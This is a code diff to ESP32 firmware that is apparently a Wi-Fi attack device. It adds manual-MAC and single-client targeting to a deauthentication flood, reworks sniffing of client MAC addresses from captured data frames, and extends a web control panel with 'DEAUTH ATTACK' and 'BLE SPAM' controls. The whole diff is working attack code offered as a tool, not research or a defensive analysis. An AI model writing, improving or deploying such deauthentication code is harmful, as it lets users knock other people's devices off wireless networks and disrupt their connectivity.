@@ -81,6 +81,9 @@ static uint8_t s_target_bssid[6] = {0};
 static uint8_t s_target_channel  = 8;
 static char    s_target_ssid[33] = "WIFI-2";
 
+static uint8_t s_target_client[6];
+static volatile bool s_target_client_valid = false;
+
 static volatile bool s_deauth_running = false;
 static volatile bool s_deauth_broadcast = true;
 static volatile uint32_t s_deauth_count = 0;
@@ -1035,42 +1038,24 @@ static void IRAM_ATTR promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type
 
     /* Also catch data frames to learn associated clients */
     if (type == WIFI_PKT_DATA && len >= 24) {
-        /* 802.11 data frame: addr1=receiver, addr2=sender, addr3=BSSID (To AP) or BSSID (From AP) */
         uint8_t *addr1 = (uint8_t *)(frame + 4);
         uint8_t *addr2 = (uint8_t *)(frame + 10);
         uint8_t *addr3 = (uint8_t *)(frame + 16);
 
-        /* Filter: only care about frames involving the target AP's BSSID */
-        bool to_ap   = (s_client_count == 0 || memcmp(addr3, s_clients[0].mac, 6) == 0);
-        bool from_ap = false;
-
-        /* addr3 might be the target BSSID */
+        /* Check if addr3 matches any known AP BSSID */
+        bool addr3_is_ap = false;
         for (int i = 0; i < s_network_count; i++) {
             if (memcmp(addr3, s_networks[i].bssid, 6) == 0) {
-                from_ap = true;
+                addr3_is_ap = true;
                 break;
             }
         }
 
-        /* If this frame is TO the AP (addr3 == BSSID), then addr2 is the client */
-        /* If this frame is FROM the AP (addr2 == BSSID), then addr1 is the client */
         uint8_t *client_mac = NULL;
-        if (from_ap) {
-            /* From AP — addr1 is client (skip broadcast) */
-            if (!(addr1[0] & 0x01)) client_mac = addr1;
-        } else {
-            /* Try to detect if addr3 matches a known AP BSSID */
-            bool addr3_is_ap = false;
-            for (int i = 0; i < s_network_count; i++) {
-                if (memcmp(addr3, s_networks[i].bssid, 6) == 0) {
-                    addr3_is_ap = true;
-                    break;
-                }
-            }
-            if (addr3_is_ap) {
-                /* To AP — addr2 is client */
-                if (!(addr2[0] & 0x01)) client_mac = addr2;
-            }
+        if (addr3_is_ap) {
+            /* addr3 == BSSID */
+            if (!(addr1[0] & 0x01)) client_mac = addr1;  /* From AP → addr1 = client */
+            else if (!(addr2[0] & 0x01)) client_mac = addr2;  /* To AP → addr2 = client */
         }
 
         if (client_mac) {
@@ -1156,17 +1141,26 @@ static void deauth_task(void *arg)
                     vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
                 }
             }
-        } else {
-            for (int c = 0; c < s_client_count && s_deauth_running; c++) {
-                for (int i = 0; i < burst && s_deauth_running; i++) {
-                    send_deauth(s_target_bssid, s_clients[c].mac, reason, s_target_channel);
-                    vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
-                }
+    } else if (s_target_client_valid) {
+        /* Single targeted client */
+        for (int i = 0; i < burst && s_deauth_running; i++) {
+            send_deauth(s_target_bssid, s_target_client, reason, s_target_channel);
+            vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
+        }
+    } else {
+        for (int c = 0; c < s_client_count && s_deauth_running; c++) {
+            if (is_whitelisted(s_clients[c].mac)) continue;
+            for (int i = 0; i < burst && s_deauth_running; i++) {
+                send_deauth(s_target_bssid, s_clients[c].mac, reason, s_target_channel);
+                vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
             }
         }
-        /* Pause between cycles — device can't reconnect during this time */
+    }
+        /* Pause between cycles */
         if (s_deauth_interval_ms > 0) {
             vTaskDelay(pdMS_TO_TICKS(s_deauth_interval_ms));
+        } else {
+            vTaskDelay(pdMS_TO_TICKS(10)); /* prevent tight loop */
         }
     }
 
@@ -1448,9 +1442,12 @@ static const char index_html[] =
 "<br><button class='d' onclick='ble_start()'>START BLE SPAM</button>"
 "<button onclick='ble_stop()'>STOP</button></div>"
 "<div class='card'><h2>DEAUTH ATTACK</h2>"
-"<div><select id='tgt'><option value='all'>All (broadcast)</option>"
-"<option value='client'>Specific client</option></select>"
-"<select id='csl' style='display:none'><option value=''>Select client</option></select></div>"
+"<div><select id='tgt' onchange='document.getElementById(\"csl\").style.display=this.value==\"manual\"?\"inline-block\":\"none\";document.getElementById(\"manmac\").style.display=this.value==\"manual\"?\"inline-block\":\"none\"'>"
+"<option value='all'>All (broadcast)</option>"
+"<option value='client'>Specific client (from scan)</option>"
+"<option value='manual'>Manual MAC</option></select>"
+"<select id='csl' style='display:none'><option value=''>Select client</option></select>"
+"<input type='text' id='manmac' placeholder='AA:BB:CC:DD:EE:FF' style='width:160px;display:none'></div>"
 "<div><select id='rsn'><option value='1'>1-Unspecified</option>"
 "<option value='3'>3-Deauth leaving</option>"
 "<option value='4' selected>4-Inactivity</option>"
@@ -1502,9 +1499,6 @@ static const char index_html[] =
 "var h='';if(d.count==0){h='Empty'}else{"
 "d.whitelist.forEach(function(m){h+='<div>'+m+' <button class=\"sm rm\" onclick=\"wlrm(\\''+m+'\\')\">remove</button></div>'});}"
 "document.getElementById('wl').innerHTML=h;})}"
-"document.getElementById('tgt').onchange=function(){"
-"document.getElementById('csl').style.display="
-"this.value=='client'?'inline-block':'none'};"
 "function start(){var t=document.getElementById('tgt').value;"
 "var r=document.getElementById('rsn').value;"
 "var b=document.getElementById('brst').value;"
@@ -1512,7 +1506,9 @@ static const char index_html[] =
 "var u='/api/deauth?reason='+r+'&burst='+b+'&interval='+iv;"
 "if(t=='client'){var c=document.getElementById('csl').value;"
 "if(!c){L('Select client!');return}u+='&client='+c}"
-"L('Attack: '+(t=='client'?c:'broadcast'));"
+"else if(t=='manual'){var m=document.getElementById('manmac').value;"
+"if(!m){L('Enter MAC!');return}u+='&client='+m}"
+"L('Attack: '+(t=='all'?'broadcast':(t=='manual'?m:c)));"
 "fetch(u).then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
 "}"
 "function stop(){fetch('/api/stop').then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
@@ -1702,6 +1698,7 @@ static esp_err_t handle_deauth(httpd_req_t *req)
     uint16_t reason = atoi(reason_str);
     uint8_t  burst  = atoi(burst_str);
     uint16_t interval = atoi(interval_str);
+    if (reason > 66) reason = 4;  /* Valid IEEE 802.11 reason codes: 1-66 */
     if (burst < 1) burst = 1;
     if (burst > 100) burst = 100;
 
@@ -1725,14 +1722,14 @@ static esp_err_t handle_deauth(httpd_req_t *req)
         ESP_LOGI(TAG, "Deauth client %s reason=%u burst=%u", client_str, reason, burst);
         s_deauth_running = true;
         s_deauth_broadcast = false;
-        /* Store the single client for the task */
-        s_client_count = 1;
-        memcpy(s_clients[0].mac, client_mac, 6);
+        memcpy(s_target_client, client_mac, 6);
+        s_target_client_valid = true;
         xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, NULL);
     } else {
         ESP_LOGI(TAG, "Deauth broadcast reason=%u burst=%u", reason, burst);
         s_deauth_running = true;
         s_deauth_broadcast = true;
+        s_target_client_valid = false;
         xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, NULL);
     }
 
@@ -1776,6 +1773,22 @@ static esp_err_t handle_wl_add(httpd_req_t *req)
     uint8_t mac[6];
     sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+
+    /* Check for duplicates */
+    for (int i = 0; i < s_whitelist_count; i++) {
+        if (memcmp(s_whitelist[i], mac, 6) == 0) {
+            cJSON *json = cJSON_CreateObject();
+            cJSON_AddStringToObject(json, "status", "Already in whitelist");
+            cJSON_AddNumberToObject(json, "count", s_whitelist_count);
+            char *str = cJSON_PrintUnformatted(json);
+            httpd_resp_set_type(req, "application/json");
+            httpd_resp_send(req, str, strlen(str));
+            cJSON_free(str);
+            cJSON_Delete(json);
+            return ESP_OK;
+        }
+    }
+
     memcpy(s_whitelist[s_whitelist_count], mac, 6);
     s_whitelist_count++;
     ESP_LOGI(TAG, "Whitelist add: %s (%d total)", mac_str, s_whitelist_count);
